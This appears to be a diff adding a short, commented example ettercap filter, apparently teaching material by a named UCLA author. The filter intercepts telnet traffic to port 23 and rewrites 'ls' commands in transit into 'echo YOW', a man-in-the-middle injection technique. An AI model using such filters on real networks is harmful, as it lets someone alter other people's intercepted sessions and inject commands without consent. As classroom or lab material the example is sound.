@@ -1,0 +1,23 @@
+# simple example ettercap filter
+# by Peter Peterson pahp@cs.ucla.edu
+
+# see 'man etterfilter' or other online resources for more information.
+
+# HINT: Make sure that if you hack telnet you still remember to "hit enter"!
+
+# HINT: The fancy regex functions are weird -- I advise against them, but YMMV.
+
+# if the data is TCP/IP traffic DESTINED for port 23
+if (ip.proto == TCP && tcp.dst == 23) { # could also use ip.src or ip.dst
+
+	# if the packet contains "ls"
+	if (search(DATA.data, "ls")) {
+
+		# simple string find and replace
+		replace("ls", "echo YOW");
+
+		msg("Replaced target with replacement.");
+	}
+}
+
+# done!
